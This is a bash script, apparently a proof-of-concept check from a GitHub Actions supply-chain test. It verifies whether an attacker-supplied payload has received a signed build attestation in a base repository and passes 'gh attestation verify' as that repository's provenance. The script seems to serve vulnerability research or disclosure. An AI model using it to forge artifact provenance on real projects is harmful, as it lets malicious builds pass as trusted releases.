#!/usr/bin/env bash
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "ATT|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"; echo "ATT|DONE"; exit 0
fi
echo "ATT|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"
D=$(sha256sum out/payload.bin | cut -d' ' -f1)
echo "ATT|SUBJECT|sha256:${D}|bytes=$(wc -c <out/payload.bin)"
echo "ATT|MINT-STEP-OUTCOME|${ATTEST_OUTCOME:-unset}"
# Does the BASE repo now hold an attestation for the attacker's digest? Owner-visible, durable.
H=$(curl -s -o /tmp/a -w '%{http_code}' -H "Authorization: Bearer ${GITHUB_TOKEN}" \
    "https://api.github.com/repos/kovac-labs/zz-mq-tok-1027/attestations/sha256:${D}")
N=$(python3 -c "import json;d=json.load(open('/tmp/a'));print(len(d.get('attestations') or []))" 2>/dev/null || echo ERR)
echo "ATT|BASEREPO-ATTESTATION-LOOKUP|http=${H}|count=${N}"
python3 - <<'PY' 2>/dev/null || true
import json
d=json.load(open('/tmp/a'))
for a in (d.get('attestations') or [])[:1]:
    b=a.get('bundle',{}); dsse=b.get('dsseEnvelope',{})
    import base64
    try:
        st=json.loads(base64.b64decode(dsse['payload']))
        print("ATT|ATTESTATION-SUBJECT|"+json.dumps(st.get('subject'))[:220])
        pred=st.get('predicate',{}); bd=pred.get('buildDefinition',{})
        print("ATT|PROVENANCE-sourceRepo|"+str(bd.get('externalParameters',{}).get('workflow',{})))
        print("ATT|PROVENANCE-runnerEnv|"+str(bd.get('internalParameters',{})))
    except Exception as e:
        print("ATT|BUNDLE-PARSE|%r"%(e,))
PY
# The consumer's check: does `gh attestation verify` accept it AS THE BASE REPO's artifact?
if gh attestation verify out/payload.bin --repo kovac-labs/zz-mq-tok-1027 > /tmp/v 2>&1; then
  echo "ATT|GH-VERIFY|PASSED-as-base-repo-provenance"
else
  echo "ATT|GH-VERIFY|FAILED"
fi
sed 's/^/ATT|VERIFY-OUT|/' /tmp/v | head -20
echo "ATT|DONE"
